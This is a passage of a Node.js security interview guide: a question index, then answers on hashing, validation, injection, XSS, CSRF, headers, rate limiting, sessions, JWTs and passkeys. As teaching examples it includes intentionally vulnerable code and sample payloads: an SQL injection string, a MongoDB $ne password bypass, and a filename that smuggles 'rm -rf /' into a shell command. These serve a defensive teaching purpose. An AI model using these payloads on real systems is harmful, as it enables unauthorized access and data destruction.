- [331: What is SLSA and how does it apply to Node projects?](#331-what-is-slsa-and-how-does-it-apply-to-node-projects)
- [332: How do you verify the integrity of a container image before deploying?](#332-how-do-you-verify-the-integrity-of-a-container-image-before-deploying)
- [333: How do you approach threat modeling for a Node.js service?](#333-how-do-you-approach-threat-modeling-for-a-nodejs-service)
- [334: Apply STRIDE to a login endpoint.](#334-apply-stride-to-a-login-endpoint)
- [335: How would you design authentication for a new SaaS product today?](#335-how-would-you-design-authentication-for-a-new-saas-product-today)
- [336: What is DPoP and what problem does it solve?](#336-what-is-dpop-and-what-problem-does-it-solve)
- [337: How do you detect refresh token reuse and what do you do?](#337-how-do-you-detect-refresh-token-reuse-and-what-do-you-do)
- [338: What JWT header parameters can be abused, and how?](#338-what-jwt-header-parameters-can-be-abused-and-how)
- [339: How should JWKS fetching and caching work in a verifier?](#339-how-should-jwks-fetching-and-caching-work-in-a-verifier)
- [340: What are the trade-offs of putting roles and permissions inside JWTs?](#340-what-are-the-trade-offs-of-putting-roles-and-permissions-inside-jwts)
- [341: How do you design authorization for a complex domain like shared documents?](#341-how-do-you-design-authorization-for-a-complex-domain-like-shared-documents)
- [342: How do you prevent a confused deputy problem between services?](#342-how-do-you-prevent-a-confused-deputy-problem-between-services)
- [343: What is SPIFFE and why is it used for service identity?](#343-what-is-spiffe-and-why-is-it-used-for-service-identity)
- [344: How do you securely store and rotate a master encryption key?](#344-how-do-you-securely-store-and-rotate-a-master-encryption-key)
- [345: How do you handle encryption key rotation for data encrypted in your app?](#345-how-do-you-handle-encryption-key-rotation-for-data-encrypted-in-your-app)
- [346: Why is AES-GCM nonce reuse catastrophic?](#346-why-is-aes-gcm-nonce-reuse-catastrophic)
- [347: What is authenticated encryption and why not use AES-CBC?](#347-what-is-authenticated-encryption-and-why-not-use-aes-cbc)
- [348: How do you derive multiple keys from one secret?](#348-how-do-you-derive-multiple-keys-from-one-secret)
- [349: How does OpenSSL affect Node.js security?](#349-how-does-openssl-affect-nodejs-security)
- [350: What should you know about FIPS mode in Node.js?](#350-what-should-you-know-about-fips-mode-in-nodejs)
- [351: How can NODE_OPTIONS be abused by an attacker?](#351-how-can-node_options-be-abused-by-an-attacker)
- [352: How can module resolution be hijacked?](#352-how-can-module-resolution-be-hijacked)
- [353: Why should production app files be read-only for the Node process?](#353-why-should-production-app-files-be-read-only-for-the-node-process)
- [354: What were Node.js policies and what replaced them?](#354-what-were-nodejs-policies-and-what-replaced-them)
- [355: How do native addons affect your security posture?](#355-how-do-native-addons-affect-your-security-posture)
- [356: Are worker threads a security boundary?](#356-are-worker-threads-a-security-boundary)
- [357: How do you secure the Node.js inspector and diagnostics in production?](#357-how-do-you-secure-the-nodejs-inspector-and-diagnostics-in-production)
- [358: Describe some notable Node.js core vulnerabilities and what they teach.](#358-describe-some-notable-nodejs-core-vulnerabilities-and-what-they-teach)
- [359: What is the Node.js threat model and why does it matter?](#359-what-is-the-nodejs-threat-model-and-why-does-it-matter)
- [360: How do you secure Server-Side Rendering frameworks running on Node?](#360-how-do-you-secure-server-side-rendering-frameworks-running-on-node)
- [361: How do you protect secrets from leaking into client bundles in full-stack Node apps?](#361-how-do-you-protect-secrets-from-leaking-into-client-bundles-in-full-stack-node-apps)
- [362: How do you investigate a suspected compromised npm dependency in your app?](#362-how-do-you-investigate-a-suspected-compromised-npm-dependency-in-your-app)
- [363: Walk through an incident response for a leaked database credential.](#363-walk-through-an-incident-response-for-a-leaked-database-credential)
- [364: What are dynamic database credentials?](#364-what-are-dynamic-database-credentials)
- [365: How do you use cloud IAM roles instead of static keys in a Node app?](#365-how-do-you-use-cloud-iam-roles-instead-of-static-keys-in-a-node-app)
- [366: What is the risk of an overly permissive OIDC trust policy in CI?](#366-what-is-the-risk-of-an-overly-permissive-oidc-trust-policy-in-ci)
- [367: How do you design secure file upload processing at scale?](#367-how-do-you-design-secure-file-upload-processing-at-scale)
- [368: How do you protect image processing from parser exploits?](#368-how-do-you-protect-image-processing-from-parser-exploits)
- [369: How do you secure a multi-step flow like checkout or MFA login?](#369-how-do-you-secure-a-multi-step-flow-like-checkout-or-mfa-login)
- [370: How do you protect against credential stuffing at scale?](#370-how-do-you-protect-against-credential-stuffing-at-scale)
- [371: How would you implement risk-based authentication?](#371-how-would-you-implement-risk-based-authentication)
- [372: How do you think about security vs usability trade-offs?](#372-how-do-you-think-about-security-vs-usability-trade-offs)
- [373: How do you secure a public API used by third-party developers?](#373-how-do-you-secure-a-public-api-used-by-third-party-developers)
- [374: How do you handle security for long-running background jobs and queues?](#374-how-do-you-handle-security-for-long-running-background-jobs-and-queues)
- [375: What risks come with exposing Redis or MongoDB without auth?](#375-what-risks-come-with-exposing-redis-or-mongodb-without-auth)
- [376: How do you prevent NoSQL injection in aggregation pipelines?](#376-how-do-you-prevent-nosql-injection-in-aggregation-pipelines)
- [377: How do you build a safe search or filter API with flexible conditions?](#377-how-do-you-build-a-safe-search-or-filter-api-with-flexible-conditions)
- [378: How do you prevent SQL injection when using JSON or array operators in PostgreSQL?](#378-how-do-you-prevent-sql-injection-when-using-json-or-array-operators-in-postgresql)
- [379: What are second-order injection attacks?](#379-what-are-second-order-injection-attacks)
- [380: How do you secure server-to-server calls inside a VPC?](#380-how-do-you-secure-server-to-server-calls-inside-a-vpc)
- [381: What is zero trust in practical terms for a Node back end?](#381-what-is-zero-trust-in-practical-terms-for-a-node-back-end)
- [382: How do you protect a Node API behind a CDN or load balancer from direct access?](#382-how-do-you-protect-a-node-api-behind-a-cdn-or-load-balancer-from-direct-access)
- [383: How should a Node service handle a flood of requests it can't serve?](#383-how-should-a-node-service-handle-a-flood-of-requests-it-cant-serve)
- [384: How do you secure health check and metrics endpoints?](#384-how-do-you-secure-health-check-and-metrics-endpoints)
- [385: What logging and monitoring would let you detect an attack early?](#385-what-logging-and-monitoring-would-let-you-detect-an-attack-early)
- [386: How do you make audit logs tamper-evident?](#386-how-do-you-make-audit-logs-tamper-evident)
- [387: How do privacy laws like GDPR affect how you build a Node back end?](#387-how-do-privacy-laws-like-gdpr-affect-how-you-build-a-node-back-end)
- [388: How do you handle user data deletion in a system with backups and logs?](#388-how-do-you-handle-user-data-deletion-in-a-system-with-backups-and-logs)
- [389: What is crypto-shredding?](#389-what-is-crypto-shredding)
- [390: How do you secure a GraphQL federation or gateway setup?](#390-how-do-you-secure-a-graphql-federation-or-gateway-setup)
- [391: How do you prevent abuse of the GraphQL _entities query in federation?](#391-how-do-you-prevent-abuse-of-the-graphql-_entities-query-in-federation)
- [392: How would you secure Server-Sent Events or long polling endpoints?](#392-how-would-you-secure-server-sent-events-or-long-polling-endpoints)
- [393: How do you prevent cross-site WebSocket hijacking in depth?](#393-how-do-you-prevent-cross-site-websocket-hijacking-in-depth)
- [394: How do you secure AI or LLM features in a Node back end?](#394-how-do-you-secure-ai-or-llm-features-in-a-node-back-end)
- [395: How do you secure an MCP server written in Node.js?](#395-how-do-you-secure-an-mcp-server-written-in-nodejs)
- [396: How do you safely let users configure webhooks or integrations with URLs?](#396-how-do-you-safely-let-users-configure-webhooks-or-integrations-with-urls)
- [397: How do you build a secure "import from URL" or link preview feature?](#397-how-do-you-build-a-secure-import-from-url-or-link-preview-feature)
- [398: How do you detect and prevent business logic abuse?](#398-how-do-you-detect-and-prevent-business-logic-abuse)
- [399: How do you secure a multi-region or multi-instance session setup?](#399-how-do-you-secure-a-multi-region-or-multi-instance-session-setup)
- [400: What clock-related issues can break security?](#400-what-clock-related-issues-can-break-security)
- [401: How do you safely implement "magic link" passwordless login?](#401-how-do-you-safely-implement-magic-link-passwordless-login)
- [402: How do you secure account recovery when the user has lost MFA?](#402-how-do-you-secure-account-recovery-when-the-user-has-lost-mfa)
- [403: What are the security risks of SAML and how do you handle them in Node?](#403-what-are-the-security-risks-of-saml-and-how-do-you-handle-them-in-node)
- [404: How do you protect a Node app from a compromised identity provider tenant in multi-tenant SSO?](#404-how-do-you-protect-a-node-app-from-a-compromised-identity-provider-tenant-in-multi-tenant-sso)
- [405: How would you design rate limiting for an API with free and paid tiers?](#405-how-would-you-design-rate-limiting-for-an-api-with-free-and-paid-tiers)
- [406: How does a token bucket rate limiter work and how would you implement it in Redis?](#406-how-does-a-token-bucket-rate-limiter-work-and-how-would-you-implement-it-in-redis)
- [407: What's the security risk of caching authorization decisions?](#407-whats-the-security-risk-of-caching-authorization-decisions)
- [408: How do you prevent private data leaks through shared caches?](#408-how-do-you-prevent-private-data-leaks-through-shared-caches)
- [409: How do you secure an app that uses server-side caching of rendered pages?](#409-how-do-you-secure-an-app-that-uses-server-side-caching-of-rendered-pages)
- [410: What makes JSON Web Encryption (JWE) different and when would you use it?](#410-what-makes-json-web-encryption-jwe-different-and-when-would-you-use-it)
- [411: When would you choose opaque tokens over JWTs?](#411-when-would-you-choose-opaque-tokens-over-jwts)
- [412: How do you protect against session puzzling or session variable overloading?](#412-how-do-you-protect-against-session-puzzling-or-session-variable-overloading)
- [413: How do you handle security for feature flags and config services?](#413-how-do-you-handle-security-for-feature-flags-and-config-services)
- [414: How would you secure a Node CLI tool distributed via npm?](#414-how-would-you-secure-a-node-cli-tool-distributed-via-npm)
- [415: How do you write files securely to avoid symlink and race attacks?](#415-how-do-you-write-files-securely-to-avoid-symlink-and-race-attacks)
- [416: What is a TOCTOU bug in file handling?](#416-what-is-a-toctou-bug-in-file-handling)
- [417: How do you check that a resolved path is inside a directory, including symlinks?](#417-how-do-you-check-that-a-resolved-path-is-inside-a-directory-including-symlinks)
- [418: Why are Windows paths tricky for path traversal checks?](#418-why-are-windows-paths-tricky-for-path-traversal-checks)
- [419: How do you securely process archives (zip, tar) uploaded by users?](#419-how-do-you-securely-process-archives-zip-tar-uploaded-by-users)
- [420: How would you secure a plugin system for your Node application?](#420-how-would-you-secure-a-plugin-system-for-your-node-application)
- [421: How do you protect a Node service from memory exhaustion attacks?](#421-how-do-you-protect-a-node-service-from-memory-exhaustion-attacks)
- [422: How can caches keyed by user input become an attack vector?](#422-how-can-caches-keyed-by-user-input-become-an-attack-vector)
- [423: How do you safely handle large JSON payloads that are legitimately big?](#423-how-do-you-safely-handle-large-json-payloads-that-are-legitimately-big)
- [424: What is the risk of using `structuredClone` or `v8.deserialize` on untrusted data?](#424-what-is-the-risk-of-using-structuredclone-or-v8deserialize-on-untrusted-data)
- [425: How do you limit the damage of an RCE in a Node container?](#425-how-do-you-limit-the-damage-of-an-rce-in-a-node-container)
- [426: How do distroless or hardened images help Node security?](#426-how-do-distroless-or-hardened-images-help-node-security)
- [427: How do you manage secrets in Kubernetes properly?](#427-how-do-you-manage-secrets-in-kubernetes-properly)
- [428: How do you rotate secrets without downtime in a Node service?](#428-how-do-you-rotate-secrets-without-downtime-in-a-node-service)
- [429: How would you secure a monorepo with many Node services and shared packages?](#429-how-would-you-secure-a-monorepo-with-many-node-services-and-shared-packages)
- [430: How do you evaluate the security of a third-party SaaS your Node app depends on?](#430-how-do-you-evaluate-the-security-of-a-third-party-saas-your-node-app-depends-on)
- [431: How would you respond to a zero-day in a widely used package before a patch exists?](#431-how-would-you-respond-to-a-zero-day-in-a-widely-used-package-before-a-patch-exists)
- [432: How do you secure the Node.js build pipeline end to end?](#432-how-do-you-secure-the-nodejs-build-pipeline-end-to-end)
- [433: How do you handle security for preview environments built from pull requests?](#433-how-do-you-handle-security-for-preview-environments-built-from-pull-requests)
- [434: How do you prevent an attacker from abusing your app to send spam or phishing?](#434-how-do-you-prevent-an-attacker-from-abusing-your-app-to-send-spam-or-phishing)
- [435: How would you design secure multi-tenant file storage on S3?](#435-how-would-you-design-secure-multi-tenant-file-storage-on-s3)
- [436: What would you look for when reviewing someone's auth code in Node?](#436-what-would-you-look-for-when-reviewing-someones-auth-code-in-node)
- [437: Scenario: users report being logged in as someone else. How do you investigate?](#437-scenario-users-report-being-logged-in-as-someone-else-how-do-you-investigate)
- [438: Scenario: your API is being scraped by bots using residential IPs. What do you do?](#438-scenario-your-api-is-being-scraped-by-bots-using-residential-ips-what-do-you-do)
- [439: Scenario: an endpoint's response time spikes to seconds for certain inputs. How do you check if it's an attack?](#439-scenario-an-endpoints-response-time-spikes-to-seconds-for-certain-inputs-how-do-you-check-if-its-an-attack)
- [440: Scenario: a developer wants to disable TLS verification to call an internal service. What do you suggest?](#440-scenario-a-developer-wants-to-disable-tls-verification-to-call-an-internal-service-what-do-you-suggest)
- [441: Scenario: you find `eval` used to parse a config value from a database. How do you fix it?](#441-scenario-you-find-eval-used-to-parse-a-config-value-from-a-database-how-do-you-fix-it)
- [442: Scenario: you need to give customers a way to run custom logic in your product. How do you design it?](#442-scenario-you-need-to-give-customers-a-way-to-run-custom-logic-in-your-product-how-do-you-design-it)
- [443: Scenario: a penetration test reports "JWT secret is weak". What do you do?](#443-scenario-a-penetration-test-reports-jwt-secret-is-weak-what-do-you-do)
- [444: Scenario: an audit finds that support staff can query production data freely. How do you improve it?](#444-scenario-an-audit-finds-that-support-staff-can-query-production-data-freely-how-do-you-improve-it)
- [445: Scenario: your app must accept HTML from users (a rich text editor). How do you make it safe?](#445-scenario-your-app-must-accept-html-from-users-a-rich-text-editor-how-do-you-make-it-safe)
- [446: Scenario: you're asked to add an "export all my data" feature. What security points do you consider?](#446-scenario-youre-asked-to-add-an-export-all-my-data-feature-what-security-points-do-you-consider)
- [447: What is CSV injection and how do you prevent it?](#447-what-is-csv-injection-and-how-do-you-prevent-it)
- [448: How would you run a security program for a small Node team with limited time?](#448-how-would-you-run-a-security-program-for-a-small-node-team-with-limited-time)
- [449: How do you keep up with Node.js security without reading everything?](#449-how-do-you-keep-up-with-nodejs-security-without-reading-everything)
- [450: What has changed recently in Node.js and npm security that you should know about?](#450-what-has-changed-recently-in-nodejs-and-npm-security-that-you-should-know-about)

---

# Easy Questions (1-150)

## 1: What does security mean for a Node.js back end?

It means protecting the server, its data and its users from people who want to read data they shouldn't, change data, take over accounts or take the service down. In practice it covers many areas: login and permissions, input validation, safe database queries, secrets, HTTPS, HTTP headers, dependencies from npm, logging and how the app is deployed.

Node.js itself is not more or less secure than other platforms. Most problems come from the application code and from third-party packages, not from Node core.

## 2: What is the OWASP Top 10?

The OWASP Top 10 is a list of the most common and most serious web application security risks, published by the OWASP Foundation and updated every few years. The latest edition is from 2025. It includes things like broken access control, security misconfiguration, software supply chain failures, cryptographic failures, injection, insecure design, authentication failures, integrity failures, logging and alerting failures, and mishandling of exceptional conditions.

It is not a full checklist, but it is a good starting point and interviewers often use it to see if you know the main categories.

## 3: What is the CIA triad?

CIA stands for Confidentiality, Integrity and Availability.

- **Confidentiality:** only the right people can read the data.
- **Integrity:** data is not changed by someone who shouldn't change it.
- **Availability:** the service works when users need it.

Most security issues break one of these. A leaked database breaks confidentiality, a SQL injection that edits rows breaks integrity, and a DoS attack breaks availability.

## 4: What is the difference between authentication and authorization?

Authentication answers "who are you?". It is the login step: password, passkey, OAuth, API key and so on.

Authorization answers "what are you allowed to do?". It runs after authentication and checks if this user can read this order, delete this post or open the admin page.

A common bug is to check authentication but forget authorization, so any logged-in user can access any other user's data.

## 5: What is the difference between hashing and encryption?

Hashing is one-way. You turn data into a fixed-size value and you cannot turn it back. It is used for passwords and for checking that data hasn't changed.

Encryption is two-way. You turn data into ciphertext with a key and you can get the original back with the right key. It is used for data you need to read again, like a stored API token for a third-party service.

Passwords should be hashed, never encrypted, because the server never needs to know the original password.

## 6: Why should you never store passwords in plain text?

If the database leaks (backup stolen, SQL injection, insider), every user's password is exposed right away. Because people reuse passwords, the attacker can then log into their email, bank and other accounts.

Store a slow, salted password hash instead (Argon2id, scrypt or bcrypt). Then a leak gives the attacker hashes that are expensive to crack one by one.

## 7: What is a salt?

A salt is a random value that is generated for each password and combined with it before hashing. It is stored next to the hash, it does not need to be secret.

Salts make sure two users with the same password get different hashes, and they make precomputed tables (rainbow tables) useless. Modern libraries like bcrypt and argon2 create and store the salt for you inside the hash string.

## 8: Why are MD5 and SHA-256 not good for hashing passwords?

They are designed to be fast. A modern GPU can compute billions of SHA-256 hashes per second, so an attacker can try a huge list of passwords against a leaked hash very quickly.

Password hashing algorithms (Argon2id, scrypt, bcrypt) are slow on purpose and some also use a lot of memory, which makes guessing much more expensive. SHA-256 is still fine for other things, like checksums or HMAC.

## 9: How do you hash a password with bcrypt in Node.js?

```js
import bcrypt from "bcrypt";

const hash = await bcrypt.hash(password, 12); // 12 is the cost factor

const ok = await bcrypt.compare(loginPassword, hash);
```

The cost factor controls how slow the hash is. Each step up doubles the work. Use the async versions so you don't block the event loop. Note that bcrypt only uses the first 72 bytes of the password.

## 10: What is Argon2 and why is it recommended?

Argon2 is a password hashing algorithm that won the Password Hashing Competition in 2015. The `argon2id` variant is the one OWASP recommends first today. It is memory-hard, which means each guess needs a lot of RAM, and that makes GPU and ASIC cracking much more expensive.

You can use the `argon2` npm package, and recent Node.js versions also have a built-in `crypto.argon2()` (added in v24.7.0, still marked experimental).

```js
import argon2 from "argon2";

const hash = await argon2.hash(password); // argon2id by default
const ok = await argon2.verify(hash, loginPassword);
```

## 11: What is the built-in crypto module used for?

`node:crypto` gives you hashing, HMAC, encryption and decryption, random values, key generation, signing and verifying, key derivation (scrypt, pbkdf2, hkdf) and certificate helpers. It is backed by OpenSSL.

Node also has the Web Crypto API through `crypto.subtle`, which is the same API you have in browsers.

```js
import { createHash, randomUUID } from "node:crypto";

createHash("sha256").update("hello").digest("hex");
randomUUID();
```

## 12: Why shouldn't you use Math.random() for tokens?

`Math.random()` is not cryptographically secure. Its output comes from a fast generator whose state can be recovered from a few outputs, so an attacker may predict the next values.

For session IDs, reset tokens, API keys or OTP codes, use the `crypto` module:

```js
import { randomBytes, randomInt, randomUUID } from "node:crypto";

randomBytes(32).toString("base64url"); // token
randomInt(0, 1_000_000); // 6-digit code
randomUUID();
```

## 13: What is HTTPS and why does a Node.js API need it?

HTTPS is HTTP over TLS. TLS encrypts the traffic between the client and the server and proves the server's identity with a certificate.

Without it, anyone on the network path (public Wi-Fi, a compromised router, an ISP) can read passwords, cookies and tokens, or change responses. Every production API should use HTTPS, even internal ones if the network is not fully trusted.

## 14: Do you usually terminate TLS in Node.js itself?

Usually not. In most setups TLS ends at a load balancer, reverse proxy or ingress (Nginx, AWS ALB, Cloudflare, Kubernetes ingress) and Node receives plain HTTP on a private network.

That is fine as long as the network between the proxy and Node is private. Node can also serve HTTPS directly with `node:https` when needed, for example for service-to-service mTLS.

## 15: What is an environment variable and why are secrets stored there?

An environment variable is a key-value pair given to a process by the operating system. In Node you read it with `process.env.NAME`.

Secrets like database passwords and API keys are put there so they are not written in the source code and not committed to Git. In production they usually come from a secrets manager or the platform (Kubernetes secrets, AWS Secrets Manager, Vault), which injects them at startup.

## 16: Why should you never commit a .env file?

The `.env` file usually holds real secrets. Once it is pushed, it lives in Git history forever, even if you delete it later, and anyone with access to the repo (or a fork, or a leaked clone) can read it. Bots scan public GitHub repos for keys within minutes.

Add `.env` to `.gitignore` and commit a `.env.example` with fake values instead. If a secret was committed, rotate it. Removing it from history is not enough.

## 17: How do you load a .env file in modern Node.js?

Node has built-in support, so you don't need the `dotenv` package anymore:

```bash
node --env-file=.env server.js
node --env-file-if-exists=.env.local server.js
```

Or from code:

```js
process.loadEnvFile(); // loads ./.env
```

In production it's better to let the platform set real environment variables rather than shipping a `.env` file inside the image.

## 18: What is input validation?

Input validation means checking every piece of data that comes from outside (body, query string, URL params, headers, cookies, files, messages from queues) before you use it. You check the type, format, length and allowed values.

The rule is to trust nothing from the client. Even if the front end validates the form, an attacker can call the API directly with curl.

## 19: What is the difference between an allowlist and a denylist?

An allowlist says exactly what is allowed and rejects everything else. A denylist tries to list what is bad and allows everything else.

Allowlists are safer, because attackers are good at finding values you didn't think of. For example, allow only `^[a-z0-9_]{3,30}$` for a username instead of trying to block `<`, `'`, `;` and so on.

## 20: How do you validate request bodies in Node.js?

Use a schema validation library such as Zod, Valibot, Joi, Yup or AJV (JSON Schema). Define the shape once and reject anything that doesn't match.

```js
import { z } from "zod";

const SignupSchema = z.object({
  email: z.email(),
  password: z.string().min(12).max(128),
  name: z.string().trim().min(1).max(100),
});

app.post("/signup", (req, res) => {
  const result = SignupSchema.safeParse(req.body);
  if (!result.success) return res.status(400).json({ error: "Invalid input" });
  const { email, password, name } = result.data; // only known fields
  // ...
});
```

## 21: What is an injection attack?

An injection attack happens when user input is mixed into a command or query and the system treats part of that input as code. Common types are SQL injection, NoSQL injection, OS command injection, LDAP injection and template injection.

The fix is the same idea everywhere: keep code and data separate (parameterized queries, argument arrays instead of shell strings) and validate input.

## 22: What is SQL injection?

SQL injection is when user input is concatenated into a SQL string, so the attacker can change the query.

```js
// Vulnerable
db.query(`SELECT * FROM users WHERE email = '${req.body.email}'`);
// email = "' OR '1'='1" returns every user
```

With SQL injection an attacker can read the whole database, change or delete data and sometimes run commands on the database server.

## 23: How do you prevent SQL injection in Node.js?

Use parameterized queries (also called prepared statements). The driver sends the values separately from the SQL text, so they are never treated as SQL.

```js
// pg
await pool.query("SELECT * FROM users WHERE email = $1", [email]);

// mysql2
await conn.execute("SELECT * FROM users WHERE email = ?", [email]);
```

ORMs and query builders (Prisma, Drizzle, Knex, Sequelize, TypeORM) parameterize for you, as long as you don't use their "raw" or "unsafe" functions with string concatenation.

## 24: What is NoSQL injection?

NoSQL injection is when an attacker sends objects instead of strings, and those objects are used as query operators. In MongoDB this usually means `$` operators.

```js
// Body: { "email": "admin@site.com", "password": { "$ne": null } }
const user = await User.findOne({
  email: req.body.email,
  password: req.body.password,
});
// matches the admin without knowing the password
```

The fix is to validate types (password must be a string), and turn on Mongoose's `sanitizeFilter` option or strip keys that start with `$`.

## 25: What is command injection?

Command injection happens when user input ends up inside a shell command.

```js
import { exec } from "node:child_process";

// Vulnerable: filename = "a.txt; rm -rf /"
exec(`cat ${req.query.filename}`);
```

The shell sees `;` and runs a second command. With command injection an attacker can run anything the Node process user can run.

## 26: How do you run external commands safely?

Avoid the shell. Use `execFile` or `spawn` with an array of arguments, so the arguments are passed directly to the program and not parsed by a shell.

```js
import { execFile } from "node:child_process";

execFile("convert", [inputPath, "-resize", "200x200", outputPath], (err) => {
  // ...
});
```

Don't use `shell: true` with user input. Still validate the arguments, because some programs treat values starting with `-` as options.

## 27: What is XSS and why does a back-end developer care about it?

XSS (cross-site scripting) is when an attacker gets their JavaScript to run in another user's browser on your site. It can steal data, act as the user or change the page.

The back end is involved because it often stores the malicious input (stored XSS), reflects it in HTML responses (reflected XSS), or renders HTML templates. The server should encode output in templates, set a Content Security Policy and return JSON with the right `Content-Type`.

## 28: How do you prevent XSS in server-rendered pages?

- Use a template engine that escapes by default (EJS `<%= %>`, Handlebars `{{ }}`, Pug `#{}`, React SSR) and avoid the raw versions (`<%- %>`, `{{{ }}}`, `!{}`) with user data.
- If you must accept HTML (rich text), sanitize it with a library like DOMPurify (with jsdom on the server) or sanitize-html.
- Set a Content Security Policy.
- Set cookies as `HttpOnly` so scripts can't read them.

## 29: What is CSRF?

CSRF (cross-site request forgery) is when a malicious site makes the user's browser send a request to your site, and the browser attaches the user's cookies automatically. The server thinks the user made the request.

For example, a hidden form on `evil.com` posts to `bank.com/transfer`. If the bank uses cookie sessions without CSRF protection, the transfer goes through.

## 30: How do you protect against CSRF?

- Set session cookies with `SameSite=Lax` or `Strict`. This blocks most cross-site requests from carrying the cookie.
- Use CSRF tokens for forms and state-changing requests (for example with the `csrf-csrf` or `csrf-sync` packages).
- Check the `Origin` header (or `Sec-Fetch-Site`) on state-changing requests.
- Never change state on `GET` requests.

APIs that use a bearer token in the `Authorization` header instead of cookies are not exposed to classic CSRF, because the browser doesn't add that header by itself.

## 31: What is CORS?

CORS (Cross-Origin Resource Sharing) is a browser mechanism that lets a server say which other origins may read its responses. By default, the browser's same-origin policy blocks JavaScript on `site-a.com` from reading responses from `api.site-b.com`. The server can relax that with headers like `Access-Control-Allow-Origin`.

CORS is enforced by browsers only. It does not protect your API from curl, Postman or other servers.

## 32: How do you set up CORS in Express?

Use the `cors` package and list the allowed origins.

```js
import cors from "cors";

app.use(
  cors({
    origin: ["https://app.example.com", "https://admin.example.com"],
    credentials: true,
    methods: ["GET", "POST", "PUT", "DELETE"],
  }),
);
```

Avoid `origin: "*"` together with cookies, and don't reflect whatever `Origin` the client sends.

## 33: Is CORS a security feature that protects your API?

Not really. CORS protects users' browsers from other sites reading your responses with the user's credentials. It doesn't stop anyone from calling your API directly.

You still need authentication, authorization and rate limiting on the server. A wrong CORS config can create a hole, but a correct CORS config doesn't replace other controls.

## 34: What is Helmet?

Helmet is an Express middleware that sets a group of security-related HTTP headers with sensible defaults: `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`, `Cross-Origin-Opener-Policy` and more. It also removes the `X-Powered-By` header.

```js
import helmet from "helmet";

app.use(helmet());
```

## 35: Why should you remove the X-Powered-By header?

Express adds `X-Powered-By: Express` to every response. It tells attackers which framework you use, which helps them pick known exploits. It's a small thing, but there's no reason to advertise it.

```js
app.disable("x-powered-by");
```

Helmet removes it too.

## 36: What is the Strict-Transport-Security header?

HSTS tells the browser to only use HTTPS for your domain for a given time, even if the user types `http://` or clicks an `http://` link. This protects against SSL stripping attacks.

```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

Only send it over HTTPS, and be careful with `includeSubDomains` if some subdomains don't support HTTPS yet.

## 37: What is the X-Content-Type-Options header?

`X-Content-Type-Options: nosniff` tells the browser not to guess the content type and to use the `Content-Type` the server sent. Without it, a browser might treat an uploaded text file as HTML or JavaScript and run it.

## 38: What is clickjacking and how does the server prevent it?

Clickjacking is when another site loads your page in an invisible iframe and tricks users into clicking buttons on it.

The server prevents it with headers that block framing:

```
Content-Security-Policy: frame-ancestors 'none'
X-Frame-Options: DENY
```

`frame-ancestors` is the modern way. `X-Frame-Options` is kept for older browsers.

## 39: What is a Content Security Policy?

CSP is a response header that tells the browser where scripts, styles, images, frames and other resources may load from. If an attacker manages to inject a `<script>` tag, the browser blocks it unless it matches the policy.

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'
```

It's a second line of defense against XSS, not a replacement for output encoding.

## 40: What is rate limiting?

Rate limiting caps how many requests a client can send in a period of time, for example 100 requests per minute per IP or per user. It slows down brute force attacks, credential stuffing, scraping and simple DoS attempts, and protects expensive endpoints.

When the limit is reached, the server usually returns `429 Too Many Requests` with a `Retry-After` header.

## 41: How do you add rate limiting to an Express app?

The most common package is `express-rate-limit`.

```js
import { rateLimit } from "express-rate-limit";

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  limit: 5,
  standardHeaders: "draft-7",
  legacyHeaders: false,
});

app.post("/login", loginLimiter, loginHandler);
```

The default store is in memory, so with more than one instance you need a shared store like Redis.

## 42: What is a brute force attack?

A brute force attack tries many passwords (or codes, or tokens) until one works. Variants are dictionary attacks (common passwords), credential stuffing (username and password pairs leaked from other sites) and password spraying (one common password against many accounts).

Defenses: rate limiting, slow password hashing, MFA, account or IP throttling, bot detection and checking passwords against known breached lists.

## 43: What is a session?

A session is a way to remember a user between requests. After login, the server creates a session record (user ID, expiry and so on), stores it on the server side (memory, Redis, a database), and gives the browser a random session ID in a cookie. On each request, the server looks up the session by that ID.

## 44: Which cookie flags matter for security?

- `HttpOnly`: JavaScript can't read the cookie, which limits the damage of XSS.
- `Secure`: the cookie is only sent over HTTPS.
- `SameSite=Lax` or `Strict`: the cookie is not sent on most cross-site requests, which helps against CSRF.
- `Path` and `Domain`: limit where the cookie is sent. Don't set `Domain` if you don't need subdomains to share it.
- `Max-Age` or `Expires`: how long it lives.

```js
res.cookie("sid", sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: "lax",
  maxAge: 24 * 60 * 60 * 1000,
});
```

## 45: What is a JWT?

A JSON Web Token is a compact token with three base64url parts separated by dots: header, payload and signature. The payload holds claims like `sub` (user ID), `exp` (expiry), `iss` and `aud`. The signature, made with a secret or a private key, lets the server check that the token wasn't changed.

A normal JWT is signed, not encrypted. Anyone can decode and read the payload, so never put secrets or sensitive personal data in it.

## 46: How do you create and verify a JWT in Node.js?

With the `jsonwebtoken` package:

```js
import jwt from "jsonwebtoken";

const token = jwt.sign({ sub: user.id }, process.env.JWT_SECRET, {
  algorithm: "HS256",
  expiresIn: "15m",
});

const payload = jwt.verify(token, process.env.JWT_SECRET, {
  algorithms: ["HS256"],
});
```

Always use `verify`, never just `decode`, and always pass the list of allowed algorithms. The `jose` package is a good modern alternative that also works in edge runtimes.

## 47: Where should a web app store a JWT?

For browser apps, the safest common option is an `HttpOnly`, `Secure`, `SameSite` cookie, so JavaScript (and XSS) can't read it. Then you need CSRF protection.

`localStorage` is easy to use but any XSS can steal the token. Keeping the access token in memory and the refresh token in an `HttpOnly` cookie is a popular middle ground. For mobile apps, use the OS secure storage (Keychain, Keystore).

## 48: What is the difference between an access token and a refresh token?

An access token is short-lived (for example 5-15 minutes) and is sent with every API request. A refresh token lives longer (days or weeks) and is only used to get a new access token.

If an access token leaks, it stops working soon. The refresh token is sent to only one endpoint, stored more carefully and can be revoked on the server.

## 49: What is multi-factor authentication?

MFA means the user proves their identity with two or more different kinds of factors: something they know (password), something they have (phone, security key) and something they are (fingerprint, face).

Common second factors are TOTP apps (Google Authenticator), passkeys and hardware keys (WebAuthn), and push notifications. SMS codes are better than nothing but can be stolen through SIM swapping.

## 50: What is a passkey?

A passkey is a login credential based on public-key cryptography (WebAuthn/FIDO2). The device creates a key pair for your site. The private key stays on the device (or in the user's password manager), and the server stores only the public key.

At login the server sends a challenge, the device signs it after a fingerprint, face or PIN check, and the server verifies the signature. Passkeys can't be phished, because they're bound to your domain, and there is no password database to leak.

